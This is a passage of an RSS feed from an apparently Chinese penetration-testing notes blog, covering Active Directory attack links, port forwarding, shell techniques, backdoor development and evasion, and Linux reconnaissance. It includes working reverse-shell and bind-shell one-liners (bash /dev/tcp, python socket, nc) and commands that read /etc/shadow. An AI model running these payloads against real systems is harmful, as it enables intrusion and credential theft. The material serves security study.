&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9xb21wbHguY29tL3FvbXBseC1rbm93bGVkZ2UtZnVuZGFtZW50YWxzLW9mLWFjdGl2ZS1kaXJlY3RvcnktdHJ1c3QtcmVsYXRpb25zaGlwcy8=&#34;&gt;QOMPLX Knowledge: Fundamentals of Active Directory Trust Relationships&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC84MTI3ODY4Lmh0bWw=&#34;&gt;Kerberos 的黄金票据详解&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmFsc2lkLmV1L2Rjc2hhZG93LWV4cGxhaW5lZC00NTEwZjUyZmMxOWQ=&#34;&gt;DCShadow explained: A technical deep dive into the latest AD attack technique&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8=&#34;&gt;Active Directory Security&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnhwbnNlYy5jb20va2VyYmVyb3MtYXR0YWNrcy1wYXJ0LTEv&#34;&gt;Kerberos AD Attacks Kerberoasting&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzUxNw==&#34;&gt;Kerberos 之域内委派攻击&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NmYWx0YS9hZHNlYw==&#34;&gt;adsec&lt;/span&gt; An introduction to Active Directory security&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96ZXIxdDAuZ2l0bGFiLmlvL3Bvc3RzL2F0dGFja2luZ19hZC8=&#34;&gt;Attacking Active Directory&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc3BlY3Rlcm9wcy5pby9hc3NldHMvcmVzb3VyY2VzL0NlcnRpZmllZF9QcmUtT3duZWQucGRm&#34;&gt;Certified Pre-Owned Abusing Active Directory Certificate Services&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vYWR2YW5jZWQtdGhyZWF0LWFuYWx5dGljcy93aGF0LWlzLWF0YQ==&#34;&gt;Microsoft Advanced Threat Analytics&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzExNDczMS5odG1s&#34;&gt;Windows 内网渗透提权&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hmaXJlZjB4L1VBQ01F&#34;&gt;UACMe&lt;/span&gt; Defeating Windows User Account Control&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#协议&#34;&gt;#&lt;/a&gt; 协议&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RjZXJwYy9kY2VycGM=&#34;&gt;DEC/RPC&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWRjYW5hcnkuY29tL2Jsb2cvbXNycGMtdG8tYXR0YWNrLw==&#34;&gt;The dark side of Microsoft Remote Procedure Call protocols&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;redteam&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redteam&#34;&gt;#&lt;/a&gt; RedTeam&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tsaW9uc2VjL1JlZFRlYW1NYW51YWw=&#34;&gt;RedTeamManual&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;内网&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网&#34;&gt;#&lt;/a&gt; 内网&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjM1NA==&#34;&gt;内网安全检查&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvOTI2NDY=&#34;&gt;我所知道的内网渗透&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2wzbTBuL3BlbnRlc3Rfc3R1ZHk=&#34;&gt;从零开始内网渗透学习&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTY0OS8=&#34;&gt;渗透技巧 从 Github 下载安装文件&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9vZmZzZWMucHJvdmFkeXMuY29tL2ludHJvLXRvLWZpbGUtb3BlcmF0aW9uLWFidXNlLW9uLVdpbmRvd3MuaHRtbA==&#34;&gt;An introduction to privileged file operation abuse on Windows&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDUyMg==&#34;&gt;脚本维权 tips&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;cobalt-strike&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cobalt-strike&#34;&gt;#&lt;/a&gt; Cobalt Strike&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cubGVhbm90ZS5jb20vcG9zdC9zbm93bWluZy9Db2JhbHQtU3RyaWtl&#34;&gt;Cobalt Strike 系列笔记&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDE5MQ==&#34;&gt;渗透利器 Cobalt Strike 第 2 篇 APT 级的全面免杀与企业纵深防御体系的对抗&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/</guid>
            <title>综合技巧</title>
            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/</link>
            <category>代理</category>
            <category>Shell</category>
            <category>远程连接</category>
            <pubDate>Tue, 29 Nov 2022 15:50:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;端口转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口转发&#34;&gt;#&lt;/a&gt; 端口转发&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;windows&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;lcx&lt;/li&gt;
&lt;li&gt;netsh&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;linux&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;portmap&lt;/li&gt;
&lt;li&gt;iptables&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;socket 代理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Win: xsocks&lt;/li&gt;
&lt;li&gt;Linux: proxychains&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基于 http 的转发与 socket 代理 (低权限下的渗透)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;端口转发: tunnasocks 代理: reGeorg&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ssh 通道&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;端口转发 socks&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;获取shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取shell&#34;&gt;#&lt;/a&gt; 获取 shell&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;常规 shell 反弹&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1

python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.0.0.1&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;突破防火墙的 imcp_shell 反弹&lt;/li&gt;
&lt;li&gt;正向 shell&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;nc -e /bin/sh -lp 1234
nc.exe -e cmd.exe -lp 1234
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;内网文件传输&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网文件传输&#34;&gt;#&lt;/a&gt; 内网文件传输&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;windows 下文件传输&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;powershell&lt;/li&gt;
&lt;li&gt;vbs 脚本文件&lt;/li&gt;
&lt;li&gt;bitsadmin&lt;/li&gt;
&lt;li&gt;文件共享&lt;/li&gt;
&lt;li&gt;使用 telnet 接收数据&lt;/li&gt;
&lt;li&gt;hta&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;linux 下文件传输&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;python&lt;/li&gt;
&lt;li&gt;wget&lt;/li&gt;
&lt;li&gt;tar + ssh&lt;/li&gt;
&lt;li&gt;利用 dns 传输数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件编译&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;powershell 将 exe 转为 txt，再 txt 转为 exe&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;远程连接-执行程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程连接-执行程序&#34;&gt;#&lt;/a&gt; 远程连接 &amp;amp;&amp;amp; 执行程序&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;at&amp;amp;schtasks&lt;/li&gt;
&lt;li&gt;psexec&lt;/li&gt;
&lt;li&gt;wmic&lt;/li&gt;
&lt;li&gt;wmiexec.vbs&lt;/li&gt;
&lt;li&gt;smbexec&lt;/li&gt;
&lt;li&gt;powershell remoting&lt;/li&gt;
&lt;li&gt;SC 创建服务执行&lt;/li&gt;
&lt;li&gt;schtasks&lt;/li&gt;
&lt;li&gt;SMB+MOF || DLL Hijacks&lt;/li&gt;
&lt;li&gt;PTH + compmgmt.msc&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/</guid>
            <title>后门技术</title>
            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/</link>
            <category>渗透</category>
            <category>后门</category>
            <category>免杀</category>
            <pubDate>Tue, 29 Nov 2022 15:45:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;开发技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开发技术&#34;&gt;#&lt;/a&gt; 开发技术&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;管控功能实现技术&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统管理：查看系统基本信息，进程管理，服务管理&lt;/li&gt;
&lt;li&gt;文件管理：复制 / 粘贴文件，删除文件 / 目录，下载 / 上传文件等&lt;/li&gt;
&lt;li&gt;Shell 管理&lt;/li&gt;
&lt;li&gt;击键记录监控&lt;/li&gt;
&lt;li&gt;屏幕截取&lt;/li&gt;
&lt;li&gt;音频监控&lt;/li&gt;
&lt;li&gt;视频监控&lt;/li&gt;
&lt;li&gt;隐秘信息查看&lt;/li&gt;
&lt;li&gt;移动磁盘的动态监控&lt;/li&gt;
&lt;li&gt;远程卸载&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;自启动技术&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows 自启动
&lt;ul&gt;
&lt;li&gt;基于 Windows 启动目录的自启动&lt;/li&gt;
&lt;li&gt;基于注册表的自启动&lt;/li&gt;
&lt;li&gt;基于服务程序的自启动&lt;/li&gt;
&lt;li&gt;基于 ActiveX 控件的自启动&lt;/li&gt;
&lt;li&gt;基于计划任务（Scheduled Tasks）的自启动&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linux 自启动&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户态进程隐藏技术&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于 DLL 插入的进程隐藏
&lt;ul&gt;
&lt;li&gt;远程线程创建技术&lt;/li&gt;
&lt;li&gt;设置窗口挂钩（HOOK）技术&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;基于 SvcHost 共享服务的进程隐藏&lt;/li&gt;
&lt;li&gt;进程内存替换&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据穿透和躲避技术&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;反弹端口&lt;/li&gt;
&lt;li&gt;协议隧道
&lt;ul&gt;
&lt;li&gt;HTTP&lt;/li&gt;
&lt;li&gt;MSN&lt;/li&gt;
&lt;li&gt;Google Talk&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;内核级隐藏技术（Rootkit）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;磁盘启动级隐藏技术（Bootkit）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MBR&lt;/li&gt;
&lt;li&gt;BIOS&lt;/li&gt;
&lt;li&gt;NTLDR&lt;/li&gt;
&lt;li&gt;boot.ini&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;还原软件对抗技术&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;后门免杀&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门免杀&#34;&gt;#&lt;/a&gt; 后门免杀&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;传统静态代码检测&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加壳&lt;/li&gt;
&lt;li&gt;添加花指令&lt;/li&gt;
&lt;li&gt;输入表免杀&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;启发式代码检测&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;动态函数调用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;云查杀&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;动态增大自身体积&lt;/li&gt;
&lt;li&gt;更改云查杀服务器域名解析地址&lt;/li&gt;
&lt;li&gt;断网&lt;/li&gt;
&lt;li&gt;利用散列碰撞绕过云端 “白名单”&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;攻击主防杀毒软件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;更改系统时间&lt;/li&gt;
&lt;li&gt;窗口消息攻击&lt;/li&gt;
&lt;li&gt;主动发送 IRP 操纵主防驱动&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用证书信任&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;盗取利用合法证书&lt;/li&gt;
&lt;li&gt;利用散列碰撞伪造证书&lt;/li&gt;
&lt;li&gt;利用合法程序 DLL 劫持问题的 “白加黑”&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;检测技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检测技术&#34;&gt;#&lt;/a&gt; 检测技术&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;基于自启动信息的检测&lt;/li&gt;
&lt;li&gt;基于进程信息的检测&lt;/li&gt;
&lt;li&gt;基于数据传输的检测&lt;/li&gt;
&lt;li&gt;Rootkit/Bootkit 的检测&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;后门分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门分析&#34;&gt;#&lt;/a&gt; 后门分析&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;动态分析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;静态分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;反病毒引擎扫描&lt;/li&gt;
&lt;li&gt;文件格式识别&lt;/li&gt;
&lt;li&gt;文件加壳识别及脱壳&lt;/li&gt;
&lt;li&gt;明文字符串查找&lt;/li&gt;
&lt;li&gt;链接库及导入 / 导出函数分析&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
            <title>Linux内网渗透</title>
            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
            <category>Linux</category>
            <category>渗透</category>
            <category>信息收集</category>
            <category>痕迹清理</category>
            <pubDate>Mon, 28 Nov 2022 21:35:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
&lt;h2 id=&#34;获取内核操作系统和设备信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取内核操作系统和设备信息&#34;&gt;#&lt;/a&gt; 获取内核，操作系统和设备信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;版本信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;uname -a&lt;/code&gt;  所有版本&lt;/li&gt;
&lt;li&gt;&lt;code&gt;uname -r&lt;/code&gt;  内核版本信息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;uname -n&lt;/code&gt;  系统主机名字&lt;/li&gt;
&lt;li&gt;&lt;code&gt;uname -m&lt;/code&gt;  Linux 内核架构&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;内核信息  &lt;code&gt;cat /proc/version&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CPU 信息  &lt;code&gt;cat /proc/cpuinfo&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发布信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat /etc/*-release&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat /etc/issue&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;主机名  &lt;code&gt;hostname&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件系统  &lt;code&gt;df -a&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;内核日志  &lt;code&gt;dmesg&lt;/code&gt;  /  &lt;code&gt;/var/log/dmesg&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;用户和组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户和组&#34;&gt;#&lt;/a&gt; 用户和组&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;列出系统所有用户  &lt;code&gt;cat /etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;列出系统所有组  &lt;code&gt;cat /etc/group&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;列出所有用户 hash（root） &lt;code&gt;cat /etc/shadow&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查询用户的基本信息  &lt;code&gt;finger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;当前登录的用户  &lt;code&gt;users&lt;/code&gt;   &lt;code&gt;who -a&lt;/code&gt;   &lt;code&gt;/var/log/utmp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查询无密码用户  &lt;code&gt;grep &#39;x:0:&#39; /etc/passwd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目前登录的用户  &lt;code&gt;w&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;登入过的用户信息  &lt;code&gt;last&lt;/code&gt;  /  &lt;code&gt;/var/log/wtmp&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;显示系统中所有用户最近一次登录信息  &lt;code&gt;lastlog&lt;/code&gt;  /  &lt;code&gt;/var/log/lastlog&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;登录成功日志  &lt;code&gt;/var/log/secure&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;登录失败日志  &lt;code&gt;/var/log/faillog&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看特权用户  &lt;code&gt;grep :0 /etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看 passwd 最后修改时间  &lt;code&gt;ls -l /etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看是否存在空口令用户  &lt;code&gt;awk -F: &#39;length($2)==0 &amp;#123;print $1&amp;#125;&#39; /etc/shadow&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看远程登录的账号  &lt;code&gt;awk &#39;/\$1|\$6/&amp;#123;print $1&amp;#125;&#39; /etc/shadow&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看具有 sudo 权限的用户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat /etc/sudoers | grep -v &amp;quot;^#\|^$&amp;quot; | grep &amp;quot;ALL=(ALL)&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;用户和权限信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户和权限信息&#34;&gt;#&lt;/a&gt; 用户和权限信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;当前用户  &lt;code&gt;whoami&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;当前用户信息  &lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;可以使用 sudo 提升到 root 的用户（root）  &lt;code&gt;cat /etc/sudoers&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;列出目前用户可执行与无法执行的指令  &lt;code&gt;sudo -l&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;环境信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境信息&#34;&gt;#&lt;/a&gt; 环境信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;打印系统环境信息  &lt;code&gt;env&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;打印系统环境信息  &lt;code&gt;set&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;环境变量中的路径信息  &lt;code&gt;echo $PATH&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;打印历史命令  &lt;code&gt;history&lt;/code&gt;  /  &lt;code&gt;~/.bash_history&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;显示当前路径  &lt;code&gt;pwd&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;显示默认系统遍历  &lt;code&gt;cat /etc/profile&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;显示可用的 shell  &lt;code&gt;cat /etc/shells&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;进程信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进程信息&#34;&gt;#&lt;/a&gt; 进程信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;查看进程信息  &lt;code&gt;ps aux&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;资源占有情况  &lt;code&gt;top -c&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看进程关联文件  &lt;code&gt;lsof -c $PID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;完整命令行信息  &lt;code&gt;/proc/$PID/cmdline&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进程的命令名  &lt;code&gt;/proc/$PID/comm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进程当前工作目录的符号链接  &lt;code&gt;/proc/$PID/cwd&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;运行程序的符号链接  &lt;code&gt;/proc/$PID/exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进程的环境变量  &lt;code&gt;/proc/$PID/environ&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进程打开文件的情况  &lt;code&gt;/proc/$PID/fd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;服务信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#服务信息&#34;&gt;#&lt;/a&gt; 服务信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;由 inetd 管理的服务列表  &lt;code&gt;cat /etc/inetd.conf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;由 xinetd 管理的服务列表  &lt;code&gt;cat /etc/xinetd.conf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;nfs 服务器的配置  &lt;code&gt;cat /etc/exports&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;邮件信息  &lt;code&gt;/var/log/mailog&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ssh 配置  &lt;code&gt;sshd_config&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;计划任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#计划任务&#34;&gt;#&lt;/a&gt; 计划任务&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;显示指定用户的计划作业（root）  &lt;code&gt;crontab -l -u %user%&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;计划任务
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/var/spool/cron/*&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/spool/anacron/*&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/crontab&lt;/code&gt;&lt;/li&gt;
